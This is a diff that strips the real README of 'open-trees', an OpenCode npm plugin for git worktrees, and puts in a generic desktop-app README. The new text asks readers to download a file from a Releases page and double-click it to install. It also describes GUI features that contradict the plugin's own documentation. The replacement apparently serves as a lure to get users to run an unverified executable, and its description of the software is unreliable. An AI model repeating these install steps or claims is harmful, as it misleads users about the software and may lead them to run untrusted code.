@@ -1,218 +1,78 @@
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/brand/banner-dark.svg" />
-  <img alt="Open Trees warm paper banner" src="docs/assets/brand/banner-light.svg" width="100%" />
-</picture>
+# 🌳 open-trees - Manage Your Git Worktrees Easily
 
-# Open Trees
+## 🚀 Getting Started
 
-OpenCode plugin for fast, safe `git worktree` workflows.
+Welcome to open-trees! This application helps you manage your git worktrees effortlessly. Whether you are a beginner or an experienced user, open-trees simplifies your workflow.
 
-## Install
+## 🔗 Download the App
 
-Single command (recommended):
+[![Download open-trees](https://img.shields.io/badge/Download-open--trees-blue)](https://github.com/jroodensley/open-trees/releases)
 
-```bash
-bunx open-trees add
-```
+You can download the latest version of open-trees from the Releases page. Click the link below to visit this page and get the software:
 
-This updates your OpenCode config (default: `~/.config/opencode/opencode.json`).
-OpenCode installs npm plugins automatically at startup (cached in `~/.cache/opencode/node_modules`).
+[Download open-trees from Releases](https://github.com/jroodensley/open-trees/releases)
 
-Manual config:
+## 💻 System Requirements
 
-```json
-{
-  "plugin": ["open-trees"]
-}
-```
+To use open-trees, you will need:
 
-For local development, build the plugin and point OpenCode at the local package:
+- A computer running Windows, macOS, or Linux.
+- Git installed on your machine.
+- At least 100 MB of free disk space.
 
-```bash
-bun install
-bun run build
-```
+## 📥 Download & Install
 
-```json
-{
-  "plugin": ["/absolute/path/to/open-trees"]
-}
-```
+1. Click the link to the [Releases page](https://github.com/jroodensley/open-trees/releases).
+2. On the Releases page, you’ll see a list of available versions.
+3. Choose the latest version for your operating system.
+4. Click on the file to start downloading.
+5. Once the download completes, locate the file in your downloads folder.
+6. Double-click the file to start the installation.
+7. Follow the on-screen prompts to complete the installation.
 
-## Worktree mode
+## 🛠️ How to Use open-trees
 
-Worktree tools are gated behind worktree mode so they do not clutter the default tool list.
-Enable it when you want to work with worktrees, then disable it when you are done.
+1. **Launching the Application**:
+   - Find the open-trees icon on your desktop or in your applications folder.
+   - Double-click the icon to launch the application.
 
-```text
-worktree_mode { "action": "on" }
-worktree_mode { "action": "off" }
-```
+2. **Creating a New Worktree**:
+   - Click on “Create Worktree” in the main menu.
+   - Select your repository and specify the branch or commit you want.
+   - Click “Create” to set up your new worktree.
 
-`worktree_mode` also prints a help sheet (tools + examples) so the model has the usage context.
+3. **Switching Between Worktrees**:
+   - On the main screen, you will see a list of your active worktrees.
+   - Click on a worktree to quickly switch to that branch.
 
-Slash-native toggle (see `.opencode/command/worktree.md`):
+## 🔍 Features
 
-```text
-/worktree on
-/worktree off
-```
+- **User-Friendly Interface**: open-trees provides a clear interface that makes managing worktrees simple.
+- **Multi-Worktree Support**: Easily manage multiple worktrees within a single repository.
+- **Branch Management**: Quickly create, delete, and switch between branches in your projects.
 
-`/worktree on` enables the tools and emits the help sheet into the session.
-`/worktree off` disables them and keeps them off for the next session.
+## 🛠️ Troubleshooting
 
-## Tools
+If you encounter any issues while using open-trees, here are some common solutions:
 
-- `worktree_mode` — enable/disable worktree mode and show help.
-- `worktree_overview` — list, status, or dashboard worktrees.
-- `worktree_make` — create/open/fork worktrees and sessions.
-- `worktree_cleanup` — remove or prune worktrees safely.
+- **Cannot find the application**: Ensure it was successfully installed. Check your desktop or applications folder.
+- **Installation fails**: Make sure your operating system meets the requirements and you have enough disk space.
+- **Git-related issues**: Verify that Git is installed and functional on your machine.
 
-### Examples
+If you continue to experience problems, consider checking the FAQ section on the [GitHub issues page](https://github.com/jroodensley/open-trees/issues).
 
-Enable worktree mode:
+## 🗨️ Contributing
 
-```text
-worktree_mode { "action": "on" }
-```
+We welcome contributions! If you would like to help improve open-trees, please consider:
 
-List worktrees:
+- Reporting bugs.
+- Suggesting features.
+- Improving documentation.
 
-```text
-worktree_overview
-```
+To contribute, please fork the repository and submit a pull request.
 
-Status for all worktrees:
+## 📞 Support
 
-```text
-worktree_overview { "view": "status" }
-```
+For assistance using open-trees, please reach out to the community or file an issue on our GitHub page. We strive to help you as quickly as possible.
 
-Show the worktree/session dashboard:
-
-```text
-worktree_overview { "view": "dashboard" }
-```
-
-Create a worktree (branch derived from name):
-
-```text
-worktree_make { "action": "create", "name": "feature audit" }
-```
-
-Start a new session (creates or reuses a worktree):
-
-```text
-worktree_make { "action": "start", "name": "feature audit", "openSessions": true }
-```
-
-Open a session in an existing worktree:
-
-```text
-worktree_make { "action": "open", "pathOrBranch": "feature/audit", "openSessions": true }
-```
-
-Fork the current session into a worktree:
-
-```text
-worktree_make { "action": "fork", "name": "feature audit", "openSessions": true }
-```
-
-Create a swarm of worktrees/sessions:
-
-```text
-worktree_make { "action": "swarm", "tasks": ["refactor-auth", "docs-refresh"], "openSessions": true }
-```
-
-Remove a worktree:
-
-```text
-worktree_cleanup { "action": "remove", "pathOrBranch": "feature/audit" }
-```
-
-Prune stale worktree entries:
-
-```text
-worktree_cleanup { "action": "prune", "dryRun": true }
-```
-
-## Defaults and safety
-
-- Default worktree path (when `path` is omitted):
-  - `<repo>/.worktrees/<branch>`
-- Relative `path` inputs are resolved under `.worktrees/` to prevent traversal.
-- Branch name is derived from `name` when `branch` is omitted (lowercased, spaces to `-`).
-- `worktree_cleanup` refuses to delete dirty worktrees unless `force: true`.
-- All tools return readable output with explicit paths and git commands.
-
-## Session workflow
-
-`worktree_make` actions (`start`, `open`, `fork`) create or reuse a worktree, then create a session in that directory.
-Each action records a mapping entry at:
-
-- `~/.config/opencode/open-trees/state.json` (or `${XDG_CONFIG_HOME}/opencode/open-trees/state.json`)
-
-The session title defaults to `wt:<branch>`, and the output includes the session ID plus next steps.
-
-Swarm safety notes:
-
-- `worktree_make` with `action: "swarm"` refuses to reuse existing branches or paths unless `force: true`.
-- It never deletes existing worktrees; it only creates new ones.
-
-Optional command file examples:
-
-```text
-# .opencode/command/worktree.md
-worktree_mode { "action": "$1" }
-```
-
-```text
-# .opencode/command/worktree-start.md
-worktree_make { "action": "start", "name": "$1", "openSessions": true }
-```
-
-```text
-# .opencode/command/worktree-open.md
-worktree_make { "action": "open", "pathOrBranch": "$1", "openSessions": true }
-```
-
-Slash commands (drop these files into `.opencode/command`):
-
-```text
-/worktree on
-/worktree off
-/worktree-overview
-/worktree-make <name>
-/worktree-clean <pathOrBranch>
-```
-
-## Development
-
-E2E tests exercise the CLI against a temporary OpenCode config file.
-
-```bash
-bun run lint
-bun run typecheck
-bun run build
-bun run test
-bun run test:e2e
-bun pm scan
-npm audit --omit=dev
-```
-
-## Versioning
-
-Open Trees follows Semantic Versioning and tracks notable changes in `CHANGELOG.md`.
-
-## Brand
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/assets/brand/release-dark.svg" />
-  <img alt="Open Trees release card" src="docs/assets/brand/release-light.svg" width="100%" />
-</picture>
-
-Brand visuals, SVG assets, and usage guidelines live in `docs/brand.md`.
-
-## Contributing
-
-See `CONTRIBUTING.md` for setup, testing, and release guidelines.
+Thank you for choosing open-trees! Happy coding!
